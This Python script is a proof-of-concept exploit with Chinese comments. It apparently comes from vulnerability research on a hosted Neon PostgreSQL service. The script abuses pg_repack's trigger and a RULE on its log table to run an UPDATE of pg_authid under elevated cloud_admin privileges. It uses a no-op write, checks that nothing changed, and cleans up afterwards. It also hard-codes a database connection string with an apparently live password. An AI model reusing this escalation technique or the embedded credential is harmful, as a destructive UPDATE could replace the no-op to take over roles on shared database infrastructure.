# -*- coding: utf-8 -*-
"""RULE 提权写验证:cloud_admin 上下文 no-op UPDATE pg_authid(值不变=零破坏)。
动作:UPDATE pg_authid SET rolconnlimit=rolconnlimit WHERE rolname='neondb_owner'
基线:用户直 UPDATE pg_authid 应被拒;RULE 触发后若成功 = cloud_admin 写路径存在"""
import psycopg

URI = 'postgresql://neondb_owner:npg_cI5ynlaAqjU2@ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build/neondb'
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()

def q(sql, fetch=True):
    try:
        cur.execute(sql)
        return cur.fetchall() if fetch else 'OK'
    except Exception as e:
        return 'ERR: %s' % str(e)[:250]

# 0) 基线:用户直 UPDATE pg_authid(no-op)
print('[0] direct no-op update:', q("UPDATE pg_authid SET rolconnlimit=rolconnlimit WHERE rolname='neondb_owner'", fetch=False))

# 1) 搭建
q("CREATE EXTENSION IF NOT EXISTS pg_repack", fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("CREATE TABLE k_src(id int, v text)", fetch=False)
oid = q("SELECT 'k_src'::regclass::oid")[0][0]
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("CREATE TYPE repack.pk_%d AS (id int)" % oid, fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("CREATE TABLE repack.log_%d (pk repack.pk_%d, row k_src)" % (oid, oid), fetch=False)
q("CREATE TRIGGER t2 AFTER INSERT ON k_src FOR EACH ROW EXECUTE FUNCTION repack.repack_trigger('id')", fetch=False)

# 2) RULE:动作 UPDATE pg_authid(no-op,值不变)
q("DROP RULE IF EXISTS r5 ON repack.log_%d" % oid, fetch=False)
cr = q("CREATE RULE r5 AS ON INSERT TO repack.log_%d DO ALSO UPDATE pg_authid SET rolconnlimit=rolconnlimit WHERE rolname='neondb_owner'" % oid, fetch=False)
print('[2] create rule:', cr)

# 3) 触发
print('[3] trigger insert:', q("INSERT INTO k_src VALUES (1,'x')", fetch=False))

# 4) 确认值未变(零破坏校验)
print('[4] rolconnlimit unchanged:', q("SELECT rolconnlimit FROM pg_authid WHERE rolname='neondb_owner'"))

# 5) 清理
q("DROP TRIGGER IF EXISTS t2 ON k_src", fetch=False)
q("DROP RULE IF EXISTS r5 ON repack.log_%d" % oid, fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TYPE IF EXISTS repack.pk_%d" % oid, fetch=False)
q("DROP EXTENSION IF EXISTS pg_repack", fetch=False)
print('[5] cleanup:', q("SELECT tablename FROM pg_tables WHERE schemaname IN ('public','repack')"))
print('ext:', q("SELECT extname FROM pg_extension WHERE extname='pg_repack'"))
conn.close()
